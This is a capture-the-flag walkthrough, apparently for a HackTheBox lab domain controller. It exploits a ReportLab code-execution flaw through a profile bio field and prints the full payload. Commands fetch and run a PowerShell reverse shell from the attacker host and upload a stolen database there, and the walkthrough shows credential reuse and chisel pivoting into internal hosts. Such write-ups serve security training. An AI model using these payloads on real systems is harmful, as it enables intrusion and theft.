![image](https://github.com/user-attachments/assets/9d5ed6d1-39f1-4b0c-a85c-b3e794e4048c)

## 1. Recon

### 1.1. Port Scan `nmap`

```console
root@kali:~# nmap -Pn -A 10.10.11.39
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-27 12:45 +08
Nmap scan report for 10.10.11.39
Host is up (0.0046s latency).
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          nginx 1.24.0
|_http-title: Did not follow redirect to http://university.htb/
|_http-server-header: nginx/1.24.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-27 11:30:46Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: university.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: university.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=12/27%OT=53%CT=1%CU=36551%PV=Y%DS=2%DC=T%G=Y%TM=676
OS:E311C%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10E%TI=I%CI=I%II=I%SS=S
OS:%TS=U)OPS(O1=M552NW8NNS%O2=M552NW8NNS%O3=M552NW8%O4=M552NW8NNS%O5=M552NW
OS:8NNS%O6=M552NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(
OS:R=Y%DF=Y%T=80%W=FFFF%O=M552NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W
OS:=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T
OS:5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=
OS:O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF
OS:=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80
OS:%CD=Z)

Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-12-27T11:31:16
|_  start_date: N/A
|_clock-skew: 6h45m06s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

TRACEROUTE (using port 199/tcp)
HOP RTT     ADDRESS
1   4.64 ms 10.10.14.1
2   4.70 ms 10.10.11.39

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.48 seconds
```

The target machine appears to be a domain controller, let's add the hosts records to Kali:

```sh
cat << EOF >> /etc/hosts
10.10.11.39 university.htb
10.10.11.39 university.htb0
EOF
```

## 2. Exploring

### 2.1. `80`

![image](https://github.com/user-attachments/assets/c54bf4a1-72f9-4ee4-b924-34f3856fe4d5)

User login to the site accepts password and signed certificate methods, and there are `Student` and `Professor` account types for registration

![image](https://github.com/user-attachments/assets/61c6deb6-8e94-4589-9df9-079518404561)

![image](https://github.com/user-attachments/assets/f191adcf-2642-4f8d-9c7b-077186c911bc)

`Professor` registration requires review and approval

![image](https://github.com/user-attachments/assets/4d898275-f86d-4486-81fc-6a70f6329564)

Let's register for a `Student` account

![image](https://github.com/user-attachments/assets/a357d888-67cc-4e84-8f88-1a89388fdea0)

The registered `Student` account is immediately usable for login

![image](https://github.com/user-attachments/assets/2e6b4626-b602-4087-b1d4-f968de386b81)

While testing each field in the profile, it seems that the Bio changes `<script>alert(123)</script>` to just `alert(123)`

→ the site may be susceptible to cross-site scripting

![image](https://github.com/user-attachments/assets/50b9f588-5b7d-43fc-a8af-293e4253d796)

### 2.2. Getting a reverse shell

Some searching shows that this (https://github.com/c53elyas/CVE-2023-33733) may be the vulnerability 

PoC code, replace `curl http://xxx.xxx.xxx.xxx/` with the code to be executed

```xml
<para>
  <font color="[[[getattr(pow, Word('__globals__'))['os'].system('curl http://xxx.xxx.xxx.xxx/') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
    exploit
  </font>
</para>
```

There's a reverse shell PowerShell script in this repo that should work: https://github.com/joetanx/ctf/blob/main/reverse.ps1

Prepare Kali

```sh
curl -sLo /var/www/html/reverse.ps1 https://github.com/joetanx/ctf/raw/main/reverse.ps1
sed -i 's/<ADDRESS>/10.10.14.35/' /var/www/html/reverse.ps1
sed -i 's/<PORT>/4444/' /var/www/html/reverse.ps1
```

Start console:

```sh
root@kali:~# rlwrap nc -nvlp 4444
listening on [any] 4444 ...
```

Edit the PoC code to this:

```xml
<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell Invoke-WebRequest -Uri http://10.10.14.35/reverse.ps1 -OutFile ./reverse.ps1') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">exploit</font></para>
```

> [!Note]
>
> `powershell Invoke-WebRequest -Uri http://10.10.14.35/reverse.ps1 -OutFile ./reverse.ps1'`
>
> Downloads the reverse shell script

Put into the Bio editor, submit, then select profile export (it is the html to pdf generator that would execute the command)

![image](https://github.com/user-attachments/assets/50a1aa58-9945-4db2-a1fe-208b2d04e0b0)

Next, edit the PoC code to this:

```xml
<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell ./reverse.ps1') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">exploit</font></para>
```

> [!Note]
>
> `powershell ./reverse.ps1`
>
> Runs the reverse shell script

Put into the Bio editor, submit, then select profile export (it is the html to pdf generator that would execute the command)

![image](https://github.com/user-attachments/assets/59d24bed-ca36-4fdf-b3f5-ed1246da4534)

Reverse shell hooked as `university\wao` account

```pwsh
listening on [any] 4444 ...
connect to [10.10.14.35] from (UNKNOWN) [10.10.11.39] 62164

PS C:\Web\University> whoami /all

USER INFORMATION
----------------

User Name      SID
============== =============================================
university\wao S-1-5-21-2056245889-740706773-2266349663-1106


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                         Well-known group S-1-5-3                                       Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
UNIVERSITY\Web Developers                  Group            S-1-5-21-2056245889-740706773-2266349663-1129 Mandatory group, Enabled by default, Enabled group
Service asserted identity                  Well-known group S-1-18-2                                      Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

### 2.3. Searching for interesting content in `C:\Web\`

Using `Get-ChildItem` + `-Recurse` reveals:
- Database file at `C:\Web\University\db.sqlite3`
- Backup script `C:\Web\DB Backups\db-backup-automator.ps1`

```pwsh
PS C:\Web\University> Get-ChildItem -Path C:\Web -Recurse


    Directory: C:\Web


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/25/2024   4:53 PM                DB Backups
d-----        2/12/2024   4:54 PM                nginx-1.24.0
d-----       12/27/2024   5:01 AM                University


    Directory: C:\Web\DB Backups


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/25/2023  12:03 AM          24215 DB-Backup-2023-01-25.zip
-a----        2/25/2023  12:03 AM          24215 DB-Backup-2023-02-25.zip
-a----        3/25/2023  12:03 AM          24215 DB-Backup-2023-03-25.zip
-a----        4/25/2023  12:04 AM          24215 DB-Backup-2023-04-25.zip
-a----        5/25/2023  12:04 AM          24215 DB-Backup-2023-05-25.zip
-a----        6/25/2023  12:04 AM          24215 DB-Backup-2023-06-25.zip
-a----        7/25/2023  12:04 AM          24215 DB-Backup-2023-07-25.zip
-a----        8/25/2023  12:04 AM          24215 DB-Backup-2023-08-25.zip
-a----        9/25/2023  12:05 AM          24215 DB-Backup-2023-09-25.zip
-a----       10/25/2023  12:05 AM          24215 DB-Backup-2023-10-25.zip
-a----       11/25/2023  12:05 AM          24215 DB-Backup-2023-11-25.zip
-a----       12/25/2023  12:05 AM          24215 DB-Backup-2023-12-25.zip
-a----        1/25/2024  12:06 AM          24215 DB-Backup-2024-01-25.zip
-a----        2/25/2024  12:06 AM          24215 DB-Backup-2024-02-25.zip
-a----        3/25/2024  12:07 AM          24215 DB-Backup-2024-03-25.zip
-a----        4/25/2024  12:07 AM          24215 DB-Backup-2024-04-25.zip
-a----       10/14/2024   9:35 AM            386 db-backup-automator.ps1


    Directory: C:\Web\nginx-1.24.0


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/12/2024   5:47 PM                conf
d-----        2/12/2024   3:46 PM                contrib
d-----        2/12/2024   3:46 PM                docs
d-----        2/12/2024   3:46 PM                html
d-----        2/17/2024   3:06 AM                logs
d-----        2/12/2024   4:45 PM                temp
-a----        4/11/2023   8:29 AM        3811328 nginx.exe
-a----         3/3/2024   4:10 AM         111067 off
-a----        2/15/2024  12:36 AM             46 start.bat

⋮

    Directory: C:\Web\University


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/15/2024   8:13 AM                CA
d-----        2/19/2024   3:54 PM                static
d-----       10/15/2024  11:42 AM                University
-a----       12/27/2024   5:01 AM         245760 db.sqlite3
-a----       12/27/2024   5:01 AM           5459 JfMLsX.html
-a----       12/27/2024   5:01 AM              0 JfMLsX.pdf
-a----        12/3/2023   4:28 AM            666 manage.py
-a----       12/27/2024   5:00 AM            533 reverse.ps1
-a----        2/15/2024  12:51 AM            133 start-server.bat


    Directory: C:\Web\University\CA


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/15/2024   5:51 AM           1399 rootCA.crt
-a----        2/15/2024   5:48 AM           1704 rootCA.key
-a----        2/25/2024   5:41 PM             42 rootCA.srl

⋮
```

The backup script contains password for `wao`: `WebAO1337`

```pwsh
PS C:\Web\University> type "C:\Web\DB Backups\db-backup-automator.ps1"
$sourcePath = "C:\Web\University\db.sqlite3"
$destinationPath = "C:\Web\DB Backups\"
$7zExePath = "C:\Program Files\7-Zip\7z.exe"

$zipFileName = "DB-Backup-$(Get-Date -Format 'yyyy-MM-dd').zip"
$zipFilePath = Join-Path -Path $destinationPath -ChildPath $zipFileName
$7zCommand = "& `"$7zExePath`" a `"$zipFilePath`" `"$sourcePath`" -p'WebAO1337'"
Invoke-Expression -Command $7zCommand
```

### 2.3.1. Retrieve the database file

Prepare Kali for HTTP upload

```sh
mkdir /var/www/html/uploads
chown www-data:www-data /var/www/html/uploads
curl -sLo /var/www/html/upload.php https://github.com/joetanx/ctf/raw/refs/heads/main/upload.php
```

Upload the file from target

```pwsh
PS C:\Web\University> cmd /c curl -H "Content-Type:multipart/form-data" -X POST -F file=@"C:\Web\University\db.sqlite3" -v http://10.10.14.35/upload.php
cmd.exe : Note: Unnecessary use of -X or --request, POST is already inferred.
    + CategoryInfo          : NotSpecified: (Note: Unnecessa...ready inferred.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 10.10.14.35:80...* Connected to 10.10.14.35 (10.10.14.35) port 80> POST /upload.php HTTP/1.1> Host: 10.10.14.35> User-Agent: curl/8.9.1> Accept: */*> Content-Length: 245974> Content-Type: multipart/form-data; boundary=------------------------FImP9hxTAc2XfwhlwCWHQw> } [65335 bytes data]* upload completely sent off: 245974 bytes< HTTP/1.1 200 OK< Date: Sat, 28 Dec 2024 01:45:18 GMT< Server: Apache/2.4.62 (Debian)< Vary: Accept-Encoding< Content-Length: 331< Content-Type: text/html; charset=UTF-8< { [331 bytes data]100  240k  100   331  100  240k   7681  5574k --:--:-- --:--:-- --:--:-- 5593k* Connection #0 to host 10.10.14.35 left intact<!DOCTYPE html>
db.sqlite3 uploaded.<html>
  <head/>
  <body>
    <form action='upload.php' method='POST' enctype='multipart/form-data'>
      <br><br>
      Select a file to upload:
      <br><br><br>
      <input type='file' name='file'>
      <br><br><br>
      <input type='submit' name='submit'>
    </form>
  </body>
</html>
```

```console
root@kali:~# sqlite3 /var/www/html/uploads/db.sqlite3
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
```

The users are found in the `University_customuser` table, but the pbkdf2 hashes doesn't seem to be crackable, let's move on for now

```sh
sqlite> .tables
University_course           auth_group
University_course_students  auth_group_permissions
University_customuser       auth_permission
University_department       django_admin_log
University_lecture          django_content_type
University_professor        django_migrations
University_student          django_session
University_student_courses
sqlite> .headers ON
sqlite> .mode column
sqlite> SELECT * FROM University_customuser;
id  password                                                                                  last_login                  username     first_name  last_name  bio                                             csr                                       is_active  is_staff  is_superuser  failed_login_attempts  address                  joined_at                   image                                       user_type  email                  
--  ----------------------------------------------------------------------------------------  --------------------------  -----------  ----------  ---------  ----------------------------------------------  ----------------------------------------  ---------  --------  ------------  ---------------------  -----------------------  --------------------------  ------------------------------------------  ---------  -----------------------
2   pbkdf2_sha256$600000$igb7CzR3ivxQT4urvx0lWw$dAfkiIa438POS8K8s2dRNLy2BKZv7jxDnVuXqbZ61+s=  2024-02-26 01:47:32.992418  george       george      lantern                                                                                              1          0         0             0                      Canada West - Vancouver  2024-02-19 23:23:16.293609  static/assets/images/users_profiles/2.png   Professor  george@university.htb  
3   pbkdf2_sha256$600000$i8XRGybY2ASqA3kEuTW4XH$SwK7A52nA1KOnuniKifqWzrjiIyOnrZu7sf+Zvq44qc=  2024-02-20 01:06:28.437570  carol        Carol       Helgen                                                                                               1          0         0             0                      USA - Washington         2024-02-19 23:25:14.919010  static/assets/images/users_profiles/3.jpg   Professor  carol@science.com      
4   pbkdf2_sha256$600000$Bg8pRHaZsbGpLwirrZPvvn$7CtXYJhBDrGhiCvjma7X/AOKRWZS2SP0H6PAXvT96Vw=  2024-02-20 00:59:29.687668  Nour         Nour        Qasso                                                                                                1          0         0             0                      Germany - Frankfurt      2024-02-19 23:27:04.700197  static/assets/images/users_profiles/4.jpg   Professor  nour.qasso@gmail.com   
5   pbkdf2_sha256$600000$VzP8VVjEQgQw6HvYAftmCl$s9k3UC/e2++hhQDF2KzhunOaAqxbi4rugRb42dC6qr0=  2024-02-20 00:37:55.455163  martin.rose  Martin      Rose                                                                                                 1          0         0             0                      US West - Los Angeles    2024-02-19 23:28:49.293710  static/assets/images/users_profiles/5.jpg   Professor  martin.rose@hotmail.com
6   pbkdf2_sha256$600000$1s48WhgRDulQ6FsNgnXjot$SZ4piS9Ryf4mgIj0prEjN+F0pGEDtNti3b9WaQfAeTk=  2024-09-16 12:43:05.500724  nya          Nya         Laracrof                                                   static/assets/uploads/CSRs/6_mnY36oU.csr  1          0         0             0                      UK - London              2024-02-19 23:31:30.168489  static/assets/images/users_profiles/6.jpg   Professor  nya.laracrof@skype.com 
7   pbkdf2_sha256$600000$70XtdR4HrHHignt7EHiOpT$RP9/4PKHmbtCBq0FOPqyppQKjXntM89vc7jGyjk/zAk=  2024-02-26 01:42:16.677697  Steven.U     Steven      Universe   <h3>The First student in this university!</h3>  static/assets/uploads/CSRs/7.csr          1          0         0             0                      Italy - Milan            2024-02-25 23:08:44.508623  static/assets/images/users_profiles/7.jpeg  Student    steven@yahoo.com       
```

> [!Tip]
>
> sqlite doesn't automatically format the `SELECT` results
> - `.headers ON` includes the column names in the result display
> - `.mode column` formats the width to make the output more human readable

## 3. Exploring with found credentials

### 3.1. Attempt connection

```console
root@kali:~# evil-winrm -u 'WAO' -p 'WebAO1337' -i 10.10.11.39

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\WAO\Documents> whoami
university\wao
```

### 3.2. Scan for users

```console
root@kali:~# netexec ldap 10.10.11.39 -u wao -p WebAO1337 --users
SMB         10.10.11.39     445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:university.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.39     389    DC               [+] university.htb\wao:WebAO1337
LDAP        10.10.11.39     389    DC               [*] Enumerated 26 domain users: university.htb
LDAP        10.10.11.39     389    DC               -Username-                    -Last PW Set-       -BadPW- -Description-
LDAP        10.10.11.39     389    DC               Administrator                 2024-09-11 21:24:04 0       Built-in account for administering the computer/domain
LDAP        10.10.11.39     389    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain
LDAP        10.10.11.39     389    DC               krbtgt                        2024-02-12 23:36:45 0       Key Distribution Center Service Account
LDAP        10.10.11.39     389    DC               John.D                        2024-02-13 02:06:53 0
LDAP        10.10.11.39     389    DC               George.A                      2024-02-13 02:11:09 0
LDAP        10.10.11.39     389    DC               WAO                           2024-09-16 16:46:27 0
LDAP        10.10.11.39     389    DC               hana                          2024-02-20 03:40:39 0
LDAP        10.10.11.39     389    DC               karma.watterson               2024-02-20 03:44:17 0
LDAP        10.10.11.39     389    DC               Alice.Z                       2024-02-20 03:45:02 0
LDAP        10.10.11.39     389    DC               Steven.P                      2024-02-28 06:53:59 0
LDAP        10.10.11.39     389    DC               Karol.J                       2024-02-20 03:51:07 0
LDAP        10.10.11.39     389    DC               Leon.K                        2024-02-20 03:52:08 0
LDAP        10.10.11.39     389    DC               A.Crouz                       2024-02-20 03:53:07 0
LDAP        10.10.11.39     389    DC               Kai.K                         2024-02-20 03:54:16 0
LDAP        10.10.11.39     389    DC               Arnold.G                      2024-02-20 03:56:15 0
LDAP        10.10.11.39     389    DC               Kareem.A                      2024-02-20 03:58:15 0
LDAP        10.10.11.39     389    DC               Lisa.K                        2024-02-20 03:59:30 0
LDAP        10.10.11.39     389    DC               Jakken.C                      2024-02-20 04:01:27 0
LDAP        10.10.11.39     389    DC               Nya.R                         2024-02-20 04:04:00 0
LDAP        10.10.11.39     389    DC               Brose.W                       2024-02-20 04:08:34 0
LDAP        10.10.11.39     389    DC               Choco.L                       2024-02-20 04:17:25 0
LDAP        10.10.11.39     389    DC               Rose.L                        2024-02-20 04:18:36 0
LDAP        10.10.11.39     389    DC               Emma.H                        2024-02-28 06:42:23 0
LDAP        10.10.11.39     389    DC               C.Freez                       2024-02-20 04:27:06 0
LDAP        10.10.11.39     389    DC               Martin.T                      2024-02-20 05:31:46 0
LDAP        10.10.11.39     389    DC               William.B                     2024-02-28 07:20:12 0       Remote Volume Manager
```

## 3.3. Checking for other points of access

The network configuration reveals that the target is attached to a vSwitch in the `192.168.99.0/24` subnet

```pwsh
PS C:\Users\WAO\Documents> ipconfig

Windows IP Configuration


Ethernet adapter vEthernet (Internal-VSwitch1):

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::47c0:fbc9:2d7b:e4bb%6
   IPv4 Address. . . . . . . . . . . : 192.168.99.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . :
   IPv6 Address. . . . . . . . . . . : dead:beef::7340:763d:93a2:80e8
   Link-local IPv6 Address . . . . . : fe80::cbd:2d69:2221:ae4b%4
   IPv4 Address. . . . . . . . . . . : 10.10.11.39
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:2397%4
                                       10.10.10.2
```

Do a quick ping sweep from the target to find any live targets in the subnet

```
PS C:\Users\WAO\Documents> cmd /c "for /L %i in (1,1,255) do @ping -n 1 -w 1 192.168.99.%i > nul && echo 192.168.99.%i is up."
192.168.99.1 is up.
192.168.99.2 is up.
192.168.99.12 is up.
```

## 4. Investigate the new found targets

### 4.1. Establish dynamic port proxy to pivot to the subnet

Start chisel listener on Kali

```console
root@kali:~# chisel server --reverse -p 8080
2024/12/27 21:51:08 server: Reverse tunnelling enabled
2024/12/27 21:51:08 server: Fingerprint t+uug8LA+uXigXwogI+nJPtv97vwafhxzx4stLYG/yM=
2024/12/27 21:51:08 server: Listening on http://0.0.0.0:8080
```

Download Windows Chisel to Kali web server

```sh
VERSION=$(curl -sI https://github.com/jpillora/chisel/releases/latest | grep location: | cut -d / -f 8 | tr -d '\r' | tr -d 'v')
curl -sLO https://github.com/jpillora/chisel/releases/download/v$VERSION/chisel_${VERSION}_windows_amd64.gz
gzip -d chisel_${VERSION}_windows_amd64.gz
mv chisel_${VERSION}_windows_amd64 /var/www/html/chisel.exe
```

On Target:

```pwsh
PS C:\Users\WAO\Documents> certutil.exe -urlcache -f -split http://10.10.14.35/chisel.exe
****  Online  ****
  000000  ...
  94f000
CertUtil: -URLCache command completed successfully.
PS C:\Users\WAO\Documents> .\chisel.exe client 10.10.14.35:8080 R:socks
chisel.exe : 2024/12/27 12:38:41 client: Connecting to ws://10.10.14.35:8080
    + CategoryInfo          : NotSpecified: (2024/12/27 12:3...0.10.14.35:8080:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
2024/12/27 12:38:41 client: Connected (Latency 666.6Âµs)
```

Kali should show connected:

```
2024/12/27 21:53:36 server: session#1: Client version (1.10.1) differs from server version (1.10.1-0kali1)
2024/12/27 21:53:36 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Edit `/etc/proxychains4.conf` to change default `tor` setting to the chisel socks proxy

```console
root@kali:~# sed -i '/^socks4/s/9050/1080/' /etc/proxychains4.conf

root@kali:~# sed -i '/^socks4/s/socks4/socks5/' /etc/proxychains4.conf

root@kali:~# grep ^socks5 /etc/proxychains4.conf
socks5  127.0.0.1 1080
```

### 4.2. Enumeration on the new found targets

> [!Tip]
>
> 1. ProxyChains only work for TCP traffic, i.e. ICMP (ping, traceroute) and SYN (-sS) scans will not work over ProxyChains
> 2. nmap uses `-sS` by default, so the `-sT` option to use TCP Connect() scan is required
> 3. Use `-O -sV -sC` instead of `-A` to omit running traceroute
> 4. nmap scan would be quite slow over ProxyChains, use `-F` to limit the port range to top 100 ports

#### 4.2.1. 192.168.99.2

```console
root@kali:~# proxychains -q nmap -Pn -sT -O -sV -sC -F 192.168.99.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-27 23:02 +08
Nmap scan report for 192.168.99.2
Host is up (1.1s latency).
Not shown: 97 closed tcp ports (conn-refused)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU
No OS matches for host
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2024-12-27T21:50:33
|_  start_date: N/A
|_clock-skew: 6h45m04s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 157.72 seconds
```

`445` found on `192.168.99.2`, scan with nmap smb scripts:

```console
root@kali:~# proxychains -q nmap -Pn -sT -p445 --script smb-* 192.168.99.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-28 08:23 +08
Nmap scan report for 192.168.99.2
Host is up (0.017s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)

Host script results:
|_smb-flood: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: EOF
| smb-protocols:
|   dialects:
|     2:0:2
|     2:1:0
|     3:0:0
|     3:0:2
|_    3:1:1
| smb-mbenum:
|_  ERROR: Failed to connect to browser service: Could not negotiate a connection:SMB: Failed to receive bytes: EOF
|_smb-print-text: false
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 42.94 seconds
```

`wao` has access to the target over SMB, but no permissions on the shares

```console
root@kali:~# proxychains -q crackmapexec smb 192.168.99.2 -u wao -p WebAO1337 --shares
SMB         192.168.99.2    445    WS-3             [*] Windows 10 / Server 2019 Build 17763 x64 (name:WS-3) (domain:university.htb) (signing:False) (SMBv1:False)
SMB         192.168.99.2    445    WS-3             [+] university.htb\wao:WebAO1337
SMB         192.168.99.2    445    WS-3             [+] Enumerated shares
SMB         192.168.99.2    445    WS-3             Share           Permissions     Remark
SMB         192.168.99.2    445    WS-3             -----           -----------     ------
SMB         192.168.99.2    445    WS-3             ADMIN$                          Remote Admin
SMB         192.168.99.2    445    WS-3             C$                              Default share
SMB         192.168.99.2    445    WS-3             IPC$            READ            Remote IPC
```

WinRM was not scanned in nmap as it's not one of the top 100 ports in `-F` option

Just trying to connect with `evil-winrm` using `wao` credentials worked

```console
root@kali:~# proxychains -q evil-winrm -u 'WAO' -p 'WebAO1337' -i 192.168.99.2

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\wao\Documents> whoami
university\wao
*Evil-WinRM* PS C:\Users\wao\Documents> hostname
WS-3
```

#### 4.2.2. 192.168.99.12

```console
root@kali:~# proxychains -q nmap -Pn -sT -O -sV -sC -F 192.168.99.12
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-27 23:03 +08
Nmap scan report for 192.168.99.12
Host is up (1.2s latency).
Not shown: 99 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 36:8b:46:18:8e:07:78:b6:e0:0f:97:a0:f6:e1:1e:00 (RSA)
|   256 17:7a:b3:84:00:58:b7:46:2f:5b:6e:30:b8:2f:ab:73 (ECDSA)
|_  256 90:ef:af:b3:76:2d:60:80:03:4f:00:63:7b:b9:d6:45 (ED25519)
OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU
No OS matches for host
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 183.38 seconds
```

Attempt to ssh using `wao` credentials worked

```console
root@kali:~# proxychains -q ssh wao@192.168.99.12
--------------------------[!]WARNING[!]-----------------------------
|This LAB is created for web app features testing purposes ONLY....|
|Please DO NOT leave any critical information while this machine is|
|       accessible by all the "Web Developers" as sudo users       |
--------------------------------------------------------------------
wao@192.168.99.12's password:
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-213-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro
Last login: Mon Oct 21 17:11:58 2024 from 192.168.99.1
wao@LAB-2:~$ id
uid=1001(wao) gid=1001(wao) groups=1001(wao),27(sudo)
wao@LAB-2:~$ hostname
LAB-2
